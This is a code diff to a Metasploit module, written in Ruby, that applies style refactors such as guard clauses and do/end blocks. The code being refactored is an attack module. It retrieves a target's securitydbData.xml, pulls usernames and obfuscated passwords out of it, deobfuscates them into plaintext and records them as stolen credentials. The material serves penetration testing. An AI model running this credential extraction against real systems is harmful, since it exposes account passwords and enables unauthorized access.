@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -93,7 +94,7 @@ Windows and Linux.
           ]
       )
       print_status "#{peer} - Got securitydbData.xml, attempting to extract credentials..."
-      res.body.to_s.each_line { |line|
+      res.body.to_s.each_line do |line|
         # we need these checks because username and password might appear in any random position in the line
         if line.include? "username="
           username = line.match(/username="([\w]*)"/)[1]
@@ -101,12 +102,11 @@ Windows and Linux.
         if line.include? "password="
           password = line.match(/password="([\w]*)"/)[1]
         end
-        if password && username
-          plaintext_password = super_redacted_deobfuscation(password)
-          cred_table << [ username, plaintext_password ]
-          register_creds(username, plaintext_password)
-        end
-      }
+        next unless password && username
+        plaintext_password = super_redacted_deobfuscation(password)
+        cred_table << [ username, plaintext_password ]
+        register_creds(username, plaintext_password)
+      end
 
       print_line
       print_line(cred_table.to_s)
@@ -155,9 +155,7 @@ Windows and Linux.
             isthere = true
             partnum += pos.to_s
             if pos == 0
-              if !startnum
-                answer += "0"
-              end
+              answer += "0" unless startnum
             else
               startnum = true
             end
@@ -202,9 +200,7 @@ Windows and Linux.
               isthere = true
               partnum += pos.to_s
               if pos == 0
-                if !startnum
-                  answer += "0"
-                end
+                answer += "0" unless startnum
               else
                 startnum = true
               end
@@ -247,7 +243,7 @@ Windows and Linux.
   def register_creds(username, password)
     credential_data = {
       origin_type: :service,
-      module_fullname: self.fullname,
+      module_fullname: fullname,
       workspace_id: myworkspace_id,
       private_data: password,
       private_type: :password,
